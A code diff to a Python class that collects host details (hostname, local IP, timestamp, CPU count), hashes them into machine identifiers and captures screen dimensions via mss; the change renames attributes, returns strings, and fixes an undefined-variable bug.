@@ -11,10 +11,10 @@ class Info:
     def __init__(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
-        self.h = socket.gethostname()
-        self.i = s.getsockname()[0]
-        self.t = time.time()
-        self.c = multiprocessing.cpu_count()
+        self.host = socket.gethostname()
+        self.ip = s.getsockname()[0]
+        self.ts = time.time()
+        self.cpu = multiprocessing.cpu_count()
         s.close()
 
     def _hash(self, string):
@@ -22,13 +22,13 @@ class Info:
         return result.hexdigest()
 
     def info(self):
-        return self.h, self.i, self.t, self.c
+        return str(self.host) + ' ' + str(self.ip) + ' ' + str(self.ts) + ' ' + str(self.cpu)
 
     def constant(self):
-        return self._hash(str(self.h)+str(self.i))
+        return self._hash(str(self.host)+str(self.ip))
 
     def uniq(self):
-        return self._hash(str(self.h)+str(i)+str(self.t)+str(self.c))
+        return self._hash(str(self.host)+str(self.ip)+str(self.ts)+str(self.cpu))
 
     def screen(self):
         with mss.mss() as sct:
@@ -47,4 +47,4 @@ class Info:
             full = (w, h)
             os.unlink(filename)
 
-            return single, full
+            return str(single) + ' ' + str(full)
